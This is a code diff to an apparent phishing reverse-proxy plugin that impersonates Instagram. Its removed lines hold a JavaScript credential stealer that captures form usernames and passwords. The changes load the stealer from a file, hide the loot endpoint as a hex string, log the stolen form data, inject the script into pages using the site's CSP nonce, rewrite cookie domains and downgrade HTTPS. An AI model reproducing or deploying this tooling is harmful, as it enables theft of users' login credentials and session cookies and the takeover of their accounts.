@@ -1,5 +1,10 @@
+# What this instagram plugins does:
+# Intercept browser XHR requests to redirect them to the actual host
+# Create a listener for form data
+# Rewrites cookie domain
+
 import io
-import json
+import pathlib
 import re
 from dataclasses import dataclass
 
@@ -9,7 +14,18 @@ import zstandard as zstd
 actual_host: bytes = b""
 
 # Credential stealer script
-STEALER_SCRIPT: bytes = b"""document.addEventListener("click",async t=>{const e=t.target.closest("form");if(!e)return;const n=e.querySelectorAll('input[type="text"], input[type="password"]'),o={};n.forEach(t=>{const e=t.name||t.id||"unknown";o[e]=t.value});try{await fetch("/WebTheft-loot",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(o)})}catch(t){}});"""
+stealer_script: bytes
+stealer_script_location = str(pathlib.Path(__file__).parent / "instagram-inject.js")
+print(
+    "[plugins/www.instagram.com] Loading Instagram injection script: %s"
+    % (stealer_script_location)
+)
+with open(stealer_script_location, "rb") as injection_file:
+    stealer_script = injection_file.read()
+stealer_script = stealer_script.replace(b"{actual_host}", actual_host)
+
+# Intercepted data on runtime
+intercepted_data: list[bytes] = []
 
 
 # HTTP Request and response data class defnitions
@@ -30,33 +46,30 @@ class HttpResponse:
 
 def modify_request(request: HttpRequest) -> HttpRequest:
 
-    global actual_host
+    global actual_host, intercepted_data
 
     # Get route
     log: str = ""  # Log
-    log += "[plugins/www.instagram.com:modify_request] %s request for %s\n" % (
-        request.method.decode(),
-        request.target.decode(),
-    )  # Log
+    if b"/ajax/" not in request.target:
+        log += "[plugins/www.instagram.com:modify_request] %s request for %s\n" % (
+            request.method.decode(),
+            request.target.decode(),
+        )  # Log
 
     # Get username and password
-    if request.target == b"/WebTheft-loot" and request.method == b"POST":
-        try:
-            _original_body_length = len(request.body)
-            login_data = json.loads(request.body)
+    if request.target == b"/77656274686566742d6c6f6f74" and request.method == b"POST":
+        _original_body_length = len(request.body)
+        if request.body not in intercepted_data:
+            intercepted_data.append(request.body)
             log += (
-                "[plugins/www.instagram.com:modify_request] Found credentials -> %s:%s\n"
-                % (
-                    login_data["email"],
-                    login_data["pass"],
-                )
+                "[plugins/www.instagram.com:modify_request] Data intercepted on hook -> %s\n"
+                % request.body.decode(errors="ignore")
             )  # Log
-            request.body = b" " * _original_body_length
-            request.target = b"/robots.txt"
-        except Exception:
-            pass
+        request.body = b" " * _original_body_length
+        request.target = b"/api/v1"
 
-    print(log.strip())  # Log
+    if log != "":
+        print(log.strip())  # Log
 
     # Modify headers
     new_headers: list[tuple[bytes, bytes]] = []
@@ -95,7 +108,7 @@ def modify_request(request: HttpRequest) -> HttpRequest:
 
 
 def modify_response(response: HttpResponse) -> HttpResponse:
-    global STEALER_SCRIPT
+    global stealer_script
 
     log: str = ""
 
@@ -117,7 +130,7 @@ def modify_response(response: HttpResponse) -> HttpResponse:
 
             # Log only (no injection logic)
             injected: bytes = (
-                b'<script nonce="' + nonce + b'">' + STEALER_SCRIPT + b"</script>"
+                b'<script nonce="' + nonce + b'">' + stealer_script + b"</script>"
             )
 
             if (
@@ -127,7 +140,7 @@ def modify_response(response: HttpResponse) -> HttpResponse:
                 _decoded_body = _decoded_body.replace(
                     b"</title>", b"</title>" + injected
                 )
-                log += "[plugins/www.instagram.com:modify_request] Credential stealer script injected\n"
+                log += "[plugins/www.instagram.com:modify_response] Form data stealer script injected\n"
 
             response.body = cctx.compress(_decoded_body)
 
@@ -144,16 +157,11 @@ def modify_response(response: HttpResponse) -> HttpResponse:
             value = value.replace(b"www.instagram.com", actual_host)
             value = value.replace(b"https:", b"http:")
             new_headers.append((key, value))
-            pass
-        elif (
-            b"policy" in key.lower()
-            or b"security" in key.lower()
-            or b"report" in key.lower()
-            or b"trial" in key.lower()
-        ):
-            pass
+        elif key.lower() == b"set-cookie":
+            new_headers.append((key, value.replace(b"instagram.com", actual_host)))
         else:
             new_headers.append((key, value))
 
     response.headers = new_headers
+
     return response
